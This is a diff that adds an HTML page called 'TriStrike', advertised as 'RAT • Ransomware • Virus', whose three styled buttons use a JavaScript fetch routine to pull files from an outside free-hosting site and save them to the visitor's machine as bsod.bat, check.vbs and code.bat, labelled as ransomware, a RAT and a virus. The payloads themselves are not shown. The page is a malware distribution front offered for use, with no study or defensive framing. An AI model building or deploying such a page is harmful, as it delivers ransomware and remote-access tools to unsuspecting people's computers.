@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TriStrike</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .dashboard {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .header h1 {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        
+        .header p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+        
+        .buttons-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        
+        .download-btn {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 18px 24px;
+            border: none;
+            border-radius: 14px;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow: hidden;
+        }
+        
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .download-btn:hover::before {
+            opacity: 1;
+        }
+        
+        .download-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .download-btn svg {
+            width: 22px;
+            height: 22px;
+            transition: transform 0.3s;
+        }
+        
+        .download-btn:hover svg {
+            transform: translateY(2px);
+        }
+        
+        .btn-1 {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+        }
+        
+        .btn-1::before {
+            background: linear-gradient(135deg, #7c8ff5 0%, #8b60bd 100%);
+        }
+        
+        .btn-2 {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: #fff;
+        }
+        
+        .btn-2::before {
+            background: linear-gradient(135deg, #f2a5fd 0%, #f6687d 100%);
+        }
+        
+        .btn-3 {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: #1a1a2e;
+        }
+        
+        .btn-3::before {
+            background: linear-gradient(135deg, #61bdff 0%, #22ffff 100%);
+        }
+        
+        .status {
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .status.success {
+            background: rgba(72, 187, 120, 0.1);
+            border-color: rgba(72, 187, 120, 0.3);
+            color: #48bb78;
+        }
+        
+        .status.error {
+            background: rgba(245, 101, 101, 0.1);
+            border-color: rgba(245, 101, 101, 0.3);
+            color: #f56565;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .downloading {
+            animation: pulse 1s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <div class="header">
+            <h1>TriStrike</h1>
+            <p>Three attacks in one. RAT • Ransomware • Virus</p>
+        </div>
+        
+        <div class="buttons-container">
+            <!-- ============================================
+                 INSERT YOUR DOWNLOAD LINKS BELOW
+                 Replace the href values with your URLs
+            ============================================ -->
+            <a href="https://h19qjj92.000webhostapp.com/code.html" class="download-btn btn-1" download="bsod.bat" onclick="downloadFile(this, 1)">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                <span>Download RANSSOMWARE</span>
+            </a>
+            
+            <a href="https://h19qjj92.000webhostapp.com/code2.html" class="download-btn btn-2" download="check.vbs" onclick="downloadFile(this, 2)">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                <span>Download RAT</span>
+            </a>
+            
+            <a href="https://h19qjj92.000webhostapp.com/code3.html" class="download-btn btn-3" download="code.bat" onclick="downloadFile(this, 3)">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                <span>Download VIRUS</span>
+            </a>
+        </div>
+        
+        <div class="status" id="status">Ready to download</div>
+    </div>
+    
+    <script>
+        function downloadFile(link, num) {
+            event.preventDefault();
+            const status = document.getElementById('status');
+            const url = link.href;
+            const filename = link.getAttribute('download');
+            
+            status.className = 'status';
+            status.textContent = `Downloading Payload ${num}...`;
+            status.classList.add('downloading');
+            
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                    return response.blob();
+                })
+                .then(blob => {
+                    const blobUrl = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = blobUrl;
+                    a.download = filename;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(blobUrl);
+                    
+                    status.className = 'status success';
+                    status.textContent = `✓ ${filename} downloaded successfully!`;
+                    status.classList.remove('downloading');
+                })
+                .catch(error => {
+                    status.className = 'status error';
+                    status.textContent = `✗ Download failed: ${error.message}`;
+                    status.classList.remove('downloading');
+                });
+        }
+    </script>
+</body>
+</html>
